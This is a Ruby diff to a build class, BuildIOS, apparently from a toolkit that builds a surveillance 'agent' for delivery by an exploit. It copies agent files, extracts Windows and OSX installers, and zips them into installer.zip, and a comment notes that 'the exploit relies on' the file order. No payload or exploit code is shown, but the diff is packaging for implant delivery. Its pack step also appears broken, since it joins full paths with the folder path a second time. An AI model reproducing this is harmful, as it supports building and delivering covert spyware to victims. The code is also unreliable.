@@ -93,6 +93,30 @@ class BuildIOS < Build
       end
     end
 
+    # create helper directories
+    FileUtils.mkdir path('ios')
+    FileUtils.mkdir path('win')
+    FileUtils.mkdir path('osx')
+
+    # files for the agent
+    @outputs.each do |output|
+      FileUtils.cp path(output), path("ios/#{File.basename(output)}")
+    end
+
+    # installer for windows
+    Zip::ZipFile.open(path('win.zip')) do |z|
+      z.each do |f|
+        z.extract(f, path("win/#{f.name}"))
+      end
+    end
+
+    # installer for osx
+    Zip::ZipFile.open(path('osx.zip')) do |z|
+      z.each do |f|
+        z.extract(f, path("osx/#{f.name}"))
+      end
+    end
+
     # put it as the first file of the outputs, since the exploit relies on this
     @outputs.insert(0, 'output.zip')
 
@@ -101,8 +125,20 @@ class BuildIOS < Build
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
+    Zip::ZipFile.open(path('installer.zip'), Zip::ZipFile::CREATE) do |z|
+      Dir[path('ios/**')].each do |file|
+        z.file.open("ios/#{file}", "wb") { |f| f.write File.open(path("ios/#{file}"), 'rb') {|f| f.read} }
+      end
+      Dir[path('win/**')].each do |file|
+        z.file.open("win/#{file}", "wb") { |f| f.write File.open(path("win/#{file}"), 'rb') {|f| f.read} }
+      end
+      Dir[path('osx/**')].each do |file|
+        z.file.open("osx/#{file}", "wb") { |f| f.write File.open(path("osx/#{file}"), 'rb') {|f| f.read} }
+      end
+    end
+
     # we already have this file from the previous step
-    @outputs = ['output.zip']
+    @outputs = ['installer.zip']
 
   end
 
